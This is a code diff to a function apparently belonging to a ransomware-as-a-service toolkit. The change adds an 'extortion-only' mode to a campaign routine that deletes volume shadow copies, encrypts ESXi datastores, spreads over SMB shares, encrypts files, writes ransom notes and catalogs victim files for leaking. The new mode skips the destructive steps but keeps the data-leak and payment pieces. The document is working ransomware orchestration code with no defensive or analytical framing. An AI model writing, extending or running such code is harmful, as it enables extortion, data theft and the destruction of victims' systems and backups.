@@ -482,19 +482,22 @@ export async function runRaasCampaign(
     domain?: string
     forceLive?: boolean
     live?: boolean
+    extortionOnly?: boolean
   },
 ): Promise<RaasCampaignReport> {
-  const opts: RaasOpts = { live: config.live, forceLive: config.forceLive }
-  const dryRun = !destructive(opts)
+  const { shouldSkipDestructiveRaas, extortionModeFromEnv } = await import("./extortion_mode.ts")
+  const extortion = config.extortionOnly ?? shouldSkipDestructiveRaas(extortionModeFromEnv())
+  const opts: RaasOpts = { live: config.live, forceLive: config.forceLive && !extortion }
+  const dryRun = !destructive(opts) || extortion
 
-  const vss = deleteVolumeShadowCopies(opts)
+  const vss = extortion ? { executed: false, dryRun: true, platform: os.platform(), commands: [], output: "extortion-only: VSS wipe skipped", success: false } : deleteVolumeShadowCopies(opts)
   const leakCatalog = buildLeakCatalog(config.targetDir, { ...opts, maxFiles: 200 })
   const payment = generatePaymentBundle(opts)
 
-  const esxi = config.esxiHost ? await encryptEsxiDatastores(config.esxiHost, opts) : null
-  const smb = config.smbTargets?.length
+  const esxi = extortion ? null : (config.esxiHost ? await encryptEsxiDatastores(config.esxiHost, opts) : null)
+  const smb = extortion ? null : (config.smbTargets?.length
     ? spreadViaSmb(config.smbTargets, "cmd /c echo ourmine_raas_marker", { ...opts, domain: config.domain })
-    : null
+    : null)
 
   const key = generateKey()
   const keyBuf = Buffer.from(key.key, "hex")
@@ -502,7 +505,7 @@ export async function runRaasCampaign(
   const encrypted: EncryptedFile[] = []
   const notePaths: string[] = []
 
-  if (destructive(opts)) {
+  if (destructive(opts) && !extortion) {
     for (const f of files) encrypted.push(encryptFile(f, keyBuf, key.id, { live: true, forceLive: true }))
     const note = generateRansomNote({ ...config, live: true, forceLive: true }, key.id)
     for (const d of [...new Set(encrypted.map((e) => path.dirname(e.originalPath)))]) {
